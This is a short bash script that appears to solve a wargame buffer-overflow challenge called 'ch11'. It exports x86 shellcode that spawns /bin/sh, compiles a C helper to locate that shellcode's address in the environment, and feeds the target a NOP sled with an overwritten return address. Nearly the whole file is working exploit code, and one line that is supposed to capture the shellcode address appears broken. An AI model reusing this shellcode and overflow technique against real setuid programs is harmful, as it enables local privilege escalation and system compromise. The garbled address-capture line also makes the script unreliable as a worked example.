#!/bin/bash

SHELLCODE=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
export SHELLCODE

WIP=/tmp/arthour
mkdir $WIP
cd $WIP

typeset -r GETENVADDR=getEnvAddr

cat >${GETENVADDR}.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc,char**argv){
	char *ptr;

	if(argc<3){
		printf("Usage: %s <environment var> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]);

	ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;

	printf("%s will be at %p\n",argv[1],ptr);
	return 0;
}
EOF

gcc ${GETENVADDR}.c -o ${GETENVADDR}
cd -
SHELLCODE_ADDR=$WIP/$GETENVADDR SHELLCODE ./ch11

python -c 'print "\xff\xff\xff\xff/" + "\x90"*140 + "\xbf\xff\xfe\x02"[::-1]' >$WIP/exploit
./ch11 $WIP/exploit
